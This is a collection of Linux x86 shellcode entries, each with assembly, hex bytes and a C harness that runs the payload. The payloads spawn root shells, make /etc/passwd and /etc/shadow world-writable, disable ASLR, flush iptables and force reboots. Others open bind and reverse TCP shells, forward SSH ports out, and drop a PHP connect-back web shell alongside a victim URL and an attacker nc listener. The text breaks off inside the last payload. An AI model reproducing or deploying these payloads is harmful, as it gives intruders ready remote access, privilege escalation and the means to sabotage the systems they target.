"\x50\x4f\x55\x89\xe1\x50\x68\x62\x6c\x65\x73\x68\x69\x70\x74\x61\x68\x62\x69\x6e"
"\x2f\x68\x2f\x2f\x2f\x73\x89\xe3\x50\x57\x51\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";       
main(){
      int (*shell)();
      shell=sc;
      shell();
    }

08048060 <_start>:
 8048060:    31 c0                    xor    %eax,%eax
 8048062:    31 d2                    xor    %edx,%edx
 8048064:    50                       push   %eax
 8048065:    68 44 52 4f 50           push   $0x504f5244
 804806a:    89 e7                    mov    %esp,%edi
 804806c:    50                       push   %eax
 804806d:    68 54 50 55 54           push   $0x54555054
 8048072:    68 2d 50 4f 55           push   $0x554f502d
 8048077:    89 e1                    mov    %esp,%ecx
 8048079:    50                       push   %eax
 804807a:    68 62 6c 65 73           push   $0x73656c62
 804807f:    68 69 70 74 61           push   $0x61747069
 8048084:    68 62 69 6e 2f           push   $0x2f6e6962
 8048089:    68 2f 2f 2f 73           push   $0x732f2f2f
 804808e:    89 e3                    mov    %esp,%ebx
 8048090:    50                       push   %eax
 8048091:    57                       push   %edi
 8048092:    51                       push   %ecx
 8048093:    53                       push   %ebx
 8048094:    89 e1                    mov    %esp,%ecx
 8048096:    31 d2                    xor    %edx,%edx
 8048098:    b0 0b                    mov    $0xb,%al
 804809a:    cd 80                    int    $0x80




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title:	Linux x86 execve("/bin/sh") - 28 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    %eax,%eax
 8048062: 50                    push   %eax
 8048063: 68 2f 2f 73 68        push   $0x68732f2f
 8048068: 68 2f 62 69 6e        push   $0x6e69622f
 804806d: 89 e3                 mov    %esp,%ebx
 804806f: 89 c1                 mov    %eax,%ecx
 8048071: 89 c2                 mov    %eax,%edx
 8048073: b0 0b                 mov    $0xb,%al
 8048075: cd 80                 int    $0x80
 8048077: 31 c0                 xor    %eax,%eax
 8048079: 40                    inc    %eax
 804807a: cd 80                 int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73"
                   "\x68\x68\x2f\x62\x69\x6e\x89"
                   "\xe3\x89\xc1\x89\xc2\xb0\x0b"
                   "\xcd\x80\x31\xc0\x40\xcd\x80";

int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title:	Linux x86 chmod 666 /etc/passwd & /etc/shadow - 57 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       66 b9 b6 01             mov    $0x1b6,%cx
 8048066:       50                      push   %eax
 8048067:       68 73 73 77 64          push   $0x64777373
 804806c:       68 2f 2f 70 61          push   $0x61702f2f
 8048071:       68 2f 65 74 63          push   $0x6374652f
 8048076:       89 e3                   mov    %esp,%ebx
 8048078:       b0 0f                   mov    $0xf,%al
 804807a:       cd 80                   int    $0x80
 804807c:       31 c0                   xor    %eax,%eax
 804807e:       50                      push   %eax
 804807f:       68 61 64 6f 77          push   $0x776f6461
 8048084:       68 2f 2f 73 68          push   $0x68732f2f
 8048089:       68 2f 65 74 63          push   $0x6374652f
 804808e:       89 e3                   mov    %esp,%ebx
 8048090:       b0 0f                   mov    $0xf,%al
 8048092:       cd 80                   int    $0x80
 8048094:       31 c0                   xor    %eax,%eax
 8048096:       40                      inc    %eax
 8048097:       cd 80                   int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x66\xb9\xb6\x01\x50\x68\x73\x73\x77\x64"
                   "\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3"
                   "\xb0\x0f\xcd\x80\x31\xc0\x50\x68\x61\x64\x6f\x77"
                   "\x68\x2f\x2f\x73\x68\x68\x2f\x65\x74\x63\x89\xe3"
                   "\xb0\x0f\xcd\x80\x31\xc0\x40\xcd\x80";


int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
Title:	Linux x86 ASLR deactivation - 83 bytes
Author:	Jean Pascal Pereira <pereira@secbiz.de>
Web:	http://0xffe4.org


Disassembly of section .text:

08048060 <_start>:
 8048060:       31 c0                   xor    %eax,%eax
 8048062:       50                      push   %eax
 8048063:       68 70 61 63 65          push   $0x65636170
 8048068:       68 76 61 5f 73          push   $0x735f6176
 804806d:       68 69 7a 65 5f          push   $0x5f657a69
 8048072:       68 6e 64 6f 6d          push   $0x6d6f646e
 8048077:       68 6c 2f 72 61          push   $0x61722f6c
 804807c:       68 65 72 6e 65          push   $0x656e7265
 8048081:       68 79 73 2f 6b          push   $0x6b2f7379
 8048086:       68 6f 63 2f 73          push   $0x732f636f
 804808b:       68 2f 2f 70 72          push   $0x72702f2f
 8048090:       89 e3                   mov    %esp,%ebx
 8048092:       66 b9 bc 02             mov    $0x2bc,%cx
 8048096:       b0 08                   mov    $0x8,%al
 8048098:       cd 80                   int    $0x80
 804809a:       89 c3                   mov    %eax,%ebx
 804809c:       50                      push   %eax
 804809d:       66 ba 30 3a             mov    $0x3a30,%dx
 80480a1:       66 52                   push   %dx
 80480a3:       89 e1                   mov    %esp,%ecx
 80480a5:       31 d2                   xor    %edx,%edx
 80480a7:       42                      inc    %edx
 80480a8:       b0 04                   mov    $0x4,%al
 80480aa:       cd 80                   int    $0x80
 80480ac:       b0 06                   mov    $0x6,%al
 80480ae:       cd 80                   int    $0x80
 80480b0:       40                      inc    %eax
 80480b1:       cd 80                   int    $0x80



*/

#include <stdio.h>

char shellcode[] = "\x31\xc0\x50\x68\x70\x61\x63\x65\x68\x76\x61\x5f\x73\x68"
                   "\x69\x7a\x65\x5f\x68\x6e\x64\x6f\x6d\x68\x6c\x2f\x72\x61"
                   "\x68\x65\x72\x6e\x65\x68\x79\x73\x2f\x6b\x68\x6f\x63\x2f"
                   "\x73\x68\x2f\x2f\x70\x72\x89\xe3\x66\xb9\xbc\x02\xb0\x08"
                   "\xcd\x80\x89\xc3\x50\x66\xba\x30\x3a\x66\x52\x89\xe1\x31"
                   "\xd2\x42\xb0\x04\xcd\x80\xb0\x06\xcd\x80\x40\xcd\x80";


int main()
{
  fprintf(stdout,"Lenght: %d\n",strlen(shellcode));
  (*(void  (*)()) shellcode)();
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    *****************************************************
    *    Linux/x86 iptables --flush 43 bytes 	        *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
pushw  $0x462d
movl   %esp,%esi
pushl  %eax
pushl  $0x73656c62
pushl  $0x61747069
pushl  $0x2f6e6962
pushl  $0x732f2f2f
mov    %esp,%ebx
pushl  %eax
pushl  %esi
pushl  %ebx
movl   %esp,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x66\x68\x2d\x46\x89\xe6\x50\x68\x62\x6c\x65\x73"
		  "\x68\x69\x70\x74\x61\x68\x62\x69\x6e\x2f\x68\x2f\x2f\x2f"
		  "\x73\x89\xe3\x50\x56\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80";

 
int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

*****************************************************
* Linux/x86 execve-chmod 0777 /etc/shadow  57 bytes *
*****************************************************
* Author: Hamza Megahed                             *
*****************************************************
* Twitter: @Hamza_Mega                              *
*****************************************************
* blog: hamza-mega[dot]blogspot[dot]com             *
*****************************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com        *
*****************************************************

xor    %eax,%eax
push   %eax
pushl  $0x776f6461
pushl  $0x68732f2f
pushl  $0x6374652f
movl   %esp,%esi
push   %eax
pushl  $0x37373730
movl   %esp,%ebp
push   %eax
pushl  $0x646f6d68
pushl  $0x632f6e69
pushl  $0x622f2f2f
mov    %esp,%ebx
pushl  %eax
pushl  %esi
pushl  %ebp
pushl  %ebx
movl   %esp,%ecx
mov    %eax,%edx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = 
"\x31\xc0\x50\x68\x61\x64\x6f\x77\x68\x2f\x2f\x73"
"\x68\x68\x2f\x65\x74\x63\x89\xe6\x50\x68\x30\x37"
"\x37\x37\x89\xe5\x50\x68\x68\x6d\x6f\x64\x68\x69"
"\x6e\x2f\x63\x66\x68\x2f\x62\x89\xe3\x50\x56\x55"
"\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80;";



 
int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

    *****************************************************
    *    Linux/x86 execve /bin/sh shellcode 23 bytes    *
    *****************************************************
    *	  	  Author: Hamza Megahed		        *
    *****************************************************
    *             Twitter: @Hamza_Mega                  *
    *****************************************************
    *     blog: hamza-mega[dot]blogspot[dot]com         *
    *****************************************************
    *   E-mail: hamza[dot]megahed[at]gmail[dot]com      *
    *****************************************************

xor    %eax,%eax
push   %eax
push   $0x68732f2f
push   $0x6e69622f
mov    %esp,%ebx
push   %eax
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
		  "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

*****************************************************
* Linux/x86 Remote Port forwarding 87 bytes         *
* ssh -R 9999:localhost:22 192.168.0.226            *
*****************************************************
* Author: Hamza Megahed                             *
*****************************************************
* Twitter: @Hamza_Mega                              *
*****************************************************
* blog: hamza-mega[dot]blogspot[dot]com             *
*****************************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com        *
*****************************************************

xor    %eax,%eax
push   %eax
pushl  $0x3632322e
pushl  $0x30302e38
pushl  $0x36312e32
pushw  $0x3931
movl   %esp,%esi
push   %eax
push   $0x32323a74
push   $0x736f686c
push   $0x61636f6c
push   $0x3a393939
pushw  $0x3930
movl   %esp,%ebp
push   %eax
pushw  $0x522d
movl   %esp,%edi
push   %eax
push   $0x6873732f
push   $0x6e69622f
push   $0x7273752f
movl   %esp,%ebx
push   %eax
push   %esi
push   %ebp
push   %edi
push   %ebx
movl   %esp,%ecx
mov    $0xb,%al
int    $0x80

********************************
#include <stdio.h>
#include <string.h>
 
char *shellcode = 
"\x31\xc0\x50\x68\x2e\x32\x32\x36\x68\x38\x2e\x30\x30\x68\x32\x2e\x31\x36"
"\x66\x68\x31\x39\x89\xe6\x50\x68\x74\x3a\x32\x32\x68\x6c\x68\x6f\x73\x68"
"\x6c\x6f\x63\x61\x68\x39\x39\x39\x3a\x66\x68\x30\x39\x89\xe5\x50\x66\x68"
"\x2d\x52\x89\xe7\x50\x68\x2f\x73\x73\x68\x68\x2f\x62\x69\x6e\x68\x2f\x75"
"\x73\x72\x89\xe3\x50\x56\x55\x57\x53\x89\xe1\xb0\x0b\xcd\x80";



 
int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

**********************************************
* Linux/x86 Force Reboot shellcode 36 bytes  *
**********************************************
* Author: Hamza Megahed                      *
**********************************************
* Twitter: @Hamza_Mega                       *
**********************************************
* blog: hamza-mega[dot]blogspot[dot]com      *
**********************************************
* E-mail: hamza[dot]megahed[at]gmail[dot]com *
**********************************************

xor    %eax,%eax
push   %eax
push   $0x746f6f62
push   $0x65722f6e
push   $0x6962732f
mov    %esp,%ebx
push   %eax
pushw  $0x662d
mov    %esp,%esi
push   %eax
push   %esi
push   %ebx
mov    %esp,%ecx
mov    $0xb,%al
int    $0x80

**********************************************

#include <stdio.h>
#include <string.h>
 
char *shellcode = "\x31\xc0\x50\x68\x62\x6f\x6f\x74\x68\x6e"
                  "\x2f\x72\x65\x68\x2f\x73\x62\x69\x89\xe3"
                  "\x50\x66\x68\x2d\x66\x89\xe6\x50\x56\x53"
                  "\x89\xe1\xb0\x0b\xcd\x80";

int main(void)
{
fprintf(stdout,"Length: %d\n",strlen(shellcode));
(*(void(*)()) shellcode)();
return 0;
}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) 
 * - 37 bytes
 * - xgc@gotfault.net
 *
 */

char shellcode[] =

  "\x6a\x17"			// push	$0x17
  "\x58"			// pop 	%eax
  "\x31\xdb"			// xor	%ebx, %ebx
  "\xcd\x80"			// int	$0x80

  "\x6a\x2e"			// push	$0x2e	
  "\x58"			// pop	%eax
  "\x53"			// push %ebx
  "\xcd\x80"			// int	$0x80

  "\x31\xd2"			// xor	%edx, %edx
  "\x6a\x0b"			// push	$0xb
  "\x58"			// pop	%eax
  "\x52"			// push	%edx
  "\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
  "\x89\xe3"			// mov	%esp, %ebx
  "\x52"			// push	%edx
  "\x53"			// push	%ebx
  "\x89\xe1"			// mov	%esp, %ecx
  "\xcd\x80";			// int	$0x80
 
int main() {
 
	int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*
 * (Linux/x86) setreuid(0,0) + execve("/bin/sh", ["/bin/sh", NULL])
 * - 33 bytes
 * - xgc@gotfault.net
 *
 */

char shellcode[] =

  "\x6a\x46"			// push   $0x46
  "\x58"			// pop    %eax
  "\x31\xdb"			// xor	  %ebx, %ebx
  "\x31\xc9"			// xor	  %ecx, %ecx
  "\xcd\x80"			// int    $0x80

  "\x31\xd2"			// xor    %edx, %edx
  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80
 
int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * linux-x86-portbind.c - portbind shellcode 86 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
 * 
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 *
 */

char shellcode[] = 

  /* socket(AF_INET, SOCK_STREAM, 0) */

  "\x6a\x66"			// push   $0x66
  "\x58"			// pop    %eax
  "\x6a\x01"			// push   $0x1
  "\x5b"			// pop    %ebx
  "\x99"			// cltd
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x6a\x02"			// push   $0x2
  "\x89\xe1"			// mov    %esp,%ecx
  "\xcd\x80"			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  "\x52"			// push   %edx
  "\x66\x68\xfc\xc9"		// pushw  $0xc9fc  // PORT = 64713
  "\x66\x6a\x02"		// pushw  $0x2
  "\x89\xe1"			// mov    $esp,%ecx
  "\x6a\x10"			// push   $0x10
  "\x51"			// push   %ecx
  "\x50"			// push   %eax
  "\x89\xe1"			// mov    %esp,%ecx
  "\x89\xc6"			// mov    %eax,%esi
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* listen(s, anything) */

  "\xb0\x66"			// mov    $0x66,%al
  "\xd1\xe3"			// shl    %ebx
  "\xcd\x80"			// int    $0x80

  /* accept(s, 0, 0) */

  "\x52"			// push   %edx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x93"			// xchg   %eax,%ebx

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  "\x6a\x02"			// push   $0x2
  "\x59"			// pop    %ecx

  "\xb0\x3f"			// mov    $0x3f,%al
  "\xcd\x80"			// int    $0x80
  "\x49"			// dec    %ecx
  "\x79\xf9"			// jns    dup_loop

  /* execve("/bin/sh", ["/bin/sh"], NULL) */

  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80

int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/* 
 * linux-x86-authportbind.c - AUTH portbind shellcode 166 bytes for Linux/x86
 * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
 * 
 * portbind shellcode that bind()'s a shell on port 64713/tcp
 * and requests a user password.
 *
 */

char shellcode[] = 

  /* socket(AF_INET, SOCK_STREAM, 0) */

  "\x6a\x66"			// push   $0x66
  "\x58"			// pop    %eax
  "\x6a\x01"			// push   $0x1
  "\x5b"			// pop    %ebx
  "\x99"			// cltd
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x6a\x02"			// push   $0x2
  "\x89\xe1"			// mov    %esp,%ecx
  "\xcd\x80"			// int    $0x80

  /* bind(s, server, sizeof(server)) */

  "\x52"			// push   %edx
  "\x66\x68\xfc\xc9"		// pushw  $0xc9fc  // PORT = 64713
  "\x66\x6a\x02"		// pushw  $0x2
  "\x89\xe1"			// mov    $esp,%ecx
  "\x6a\x10"			// push   $0x10
  "\x51"			// push   %ecx
  "\x50"			// push   %eax
  "\x89\xe1"			// mov    %esp,%ecx
  "\x89\xc6"			// mov    %eax,%esi
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* listen(s, anything) */

  "\xb0\x66"			// mov    $0x66,%al
  "\xd1\xe3"			// shl    %ebx
  "\xcd\x80"			// int    $0x80

  /* accept(s, 0, 0) */

  "\x52"			// push   %edx
  "\x52"			// push   %edx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\x43"			// inc    %ebx
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x96"			// xchg   %eax,%esi

  /* send(s, "Password: ", 0x0a, flags) */

  "\x52"			// push   %edx
  "\x68\x72\x64\x3a\x20"	// push   $0x203a6472
  "\x68\x73\x73\x77\x6f"	// push   $0x6f777373
  "\x66\x68\x50\x61"		// pushw  $0x6150
  "\x89\xe7"			// mov    $esp,%edi
  "\x6a\x0a"			// push   $0xa
  "\x57"			// push   %edi
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\xb3\x09"			// mov    $0x9,%bl
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  /* recv(s, *buf, 0x08, flags) */

  "\x52"			// push   %edx
  "\x6a\x08"			// push   $0x8
  "\x8d\x4c\x24\x08"		// lea    0x8(%esp),%ecx
  "\x51"			// push   %ecx
  "\x56"			// push   %esi
  "\x89\xe1"			// mov    %esp,%ecx
  "\xb3\x0a"			// mov    $0xa,%bl
  "\xb0\x66"			// mov    $0x66,%al
  "\xcd\x80"			// int    $0x80

  "\x87\xf3"			// xchg   %esi,%ebx

  /* like: strncmp(string1, string2, 0x8) */
  
  "\x52"                        // push   %edx
  "\x68\x61\x75\x6c\x74"	// push   $0x746c7561 // password
  "\x68\x67\x6f\x74\x66"	// push   $0x66746f67 // here
  "\x89\xe7"			// mov    %esp,%edi
  "\x8d\x74\x24\x1c"		// lea    0x1c(%esp),%esi
  "\x89\xd1"			// mov    %edx,%ecx
  "\x80\xc1\x08"		// add    $0x8,%cl
  "\xfc"			// cld
  "\xf3\xa6"			// repz   cmpsb %es:(%edi),%ds:(%esi)
  "\x74\x04"			// je     dup

  /* exit(something) */

  "\xf7\xf0"			// div    %eax
  "\xcd\x80"			// int    $0x80

  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */

  "\x6a\x02"			// push   $0x2
  "\x59"			// pop    %ecx

  "\xb0\x3f"			// mov    $0x3f,%al
  "\xcd\x80"			// int    $0x80
  "\x49"			// dec    %ecx
  "\x79\xf9"			// jns    dup_loop

  /* execve("/bin/sh", ["/bin/sh"], NULL) */

  "\x6a\x0b"			// push   $0xb
  "\x58"			// pop    %eax
  "\x52"			// push   %edx
  "\x68\x2f\x2f\x73\x68"	// push   $0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push   $0x6e69622f
  "\x89\xe3"			// mov    %esp, %ebx
  "\x52"			// push   %edx
  "\x53"			// push   %ebx
  "\x89\xe1"			// mov    %esp, %ecx
  "\xcd\x80";			// int    $0x80


int main() {
 
        int (*f)() = (int(*)())shellcode;
        printf("Length: %u\n", strlen(shellcode));
        f();
}





////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Shell Reverse TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_reverse_tcp_shellcode

 * 72 bytes
 * null-bytes free if the port and address are
 * the ip address and port number are easily changeable (2nd to 5th bytes are the IP) and (9th and 10th are the Port)
 

 # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
 # ./shellcode

 Testing
 # nc -l 127.1.1.1 55555
 # ./shellcode 

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x68"
"\x7f\x01\x01\x01"  // <- IP Number "127.1.1.1"
"\x5e\x66\x68"
"\xd9\x03"          // <- Port Number "55555"
"\x5f\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02"
"\x89\xe1\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79"
"\xf9\xb0\x66\x56\x66\x57\x66\x6a\x02\x89\xe1\x6a"
"\x10\x51\x53\x89\xe1\xcd\x80\xb0\x0b\x52\x68\x2f"
"\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53"
"\xeb\xce";

main ()
{

        // When the IP contains null-bytes, printf will show a wrong shellcode length.

	printf("Shellcode Length:  %d\n", strlen(code));

	// Pollutes all registers ensuring that the shellcode runs in any circumstance.

	__asm__ ("movl $0xffffffff, %eax\n\t"
		 "movl %eax, %ebx\n\t"
		 "movl %eax, %ecx\n\t"
		 "movl %eax, %edx\n\t"
		 "movl %eax, %esi\n\t"
		 "movl %eax, %edi\n\t"
		 "movl %eax, %ebp");

	int (*ret)() = (int(*)())code;

	ret();

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Shell Bind TCP Random Port Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

   http://hackingbits.com
   geyslan@gmail.com

 With the great support from Tiago Natel, Sec Plus

   http://www.secplus.com.br/
   tiago4orion@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.

*/

/*

 shell_bind_tcp_random_port_shellcode

 * 65 bytes
 * null-bytes free
 * the port number is set by the system and can be discovered using nmap
   (see http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf, page 23, section 2.6.6)


 # gcc -m32 -fno-stack-protector -z execstack shell_bind_tcp_random_port_shellcode.c -o shell_bind_tcp_random_port_shellcode
 # ./shell_bind_tcp_random_port_shellcode

 Testing
 # netstat -anp | grep shell
 # nmap -sS 127.0.0.1 -p-  (It's necessary to use the TCP SYN scan option [-sS]; thus avoids that nmap connects to the port open by shellcode)
 # nc 127.0.0.1 port

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\xb3\x04\x52\x56"
"\x89\xe1\xcd\x80\xb0\x66\x43\x89\x54\x24\x08\xcd"
"\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b"
"\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89"
"\xe3\x52\x53\xeb\xca";

main ()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}



////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

/*

 Shell Bind TCP Shellcode - C Language
 Linux/x86

 Written in 2013 by Geyslan G. Bem, Hacking bits

 http://hackingbits.com
 geyslan@gmail.com

 This source is licensed under the Creative Commons
 Attribution-ShareAlike 3.0 Brazil License.

 To view a copy of this license, visit

   http://creativecommons.org/licenses/by-sa/3.0/

 You are free:

    to Share - to copy, distribute and transmit the work
    to Remix - to adapt the work
    to make commercial use of the work

 Under the following conditions:
   Attribution - You must attribute the work in the manner
                 specified by the author or licensor (but
                 not in any way that suggests that they
                 endorse you or your use of the work).

   Share Alike - If you alter, transform, or build upon
                 this work, you may distribute the
                 resulting work only under the same or
                 similar license to this one.


 shell_bind_tcp_shellcode

 * 103 bytes
 * null-bytes free
 * avoids SIGSEGV when reconnecting, setting SO_REUSEADDR (TIME_WAIT)
 * the port number is easily changeable (3th and 4th bytes of the shellcode)


 # gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
 # ./shellcode

 Testing
 # nc 127.0.0.1 11111

*/

#include <stdio.h>
#include <string.h>

unsigned char code[] = \

"\x66\xbd"
"\x2b\x67" /* <- Port number 11111 (2 bytes) */
"\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89"
"\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\x6a\x04\x54\x57"
"\x53\x56\x89\xe1\xb3\x0e\xcd\x80\xb0\x66\x89\xfb"
"\x52\x66\x55\x66\x53\x89\xe1\x6a\x10\x51\x56\x89"
"\xe1\xcd\x80\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd"
"\x80\xb0\x66\x43\x89\x54\x24\x08\xcd\x80\x93\x89"
"\xf9\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52"
"\x53\xeb\xa8";


main ()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}




////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

#include <stdlib.h>

        /* Grayscale Research: Linux Write FS PHP Connect Back Utility Shellcode
         *
         *      Function:
         *              Opens /var/www/cb.php and writes a php connectback shell to the filesystem.
         *
         *      Shellcode Size: 508 bytes (No Encodings)
         *
         *      PHP Shell Usage:
         *              // victim
         *              http://vulnhost.com/cb.php?host=192.168.1.1?port=777
         *
         *              // attacker
         *              nc -l -p 777
         *
         *      greets: #c-, #hhp, #oldskewl, d-town, sd2600, dc214, everyone else.
	 *      
	 *      
         *      ~roonr
         */


	// shellcode
 	    char sc[] = "\x68\x70\x68\x70\xff\x68\x2f\x63\x62\x2e\x68\x2f\x77\x77\x77\x68"
